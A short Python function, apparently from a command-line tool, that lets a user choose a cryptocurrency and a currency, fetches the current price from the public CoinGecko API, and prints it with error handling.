def cmd_crypto_price(ctx):
    coins = ["bitcoin", "ethereum", "solana", "cardano", "dogecoin"]
    coin = ctx["choose"]("Coin", coins) or "bitcoin"
    vs = ctx["choose"]("Currency", ["usd", "eur", "inr", "gbp"]) or "usd"
    url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin}&vs_currencies={vs}"
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            data = json.loads(r.read())
        price = data.get(coin, {}).get(vs)
        ctx["console"].print(f"[{ctx['theme'].primary}]{coin}[/]: {price} {vs.upper()}")
    except (urllib.error.URLError, json.JSONDecodeError) as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Price fetch failed: {exc}[/]")


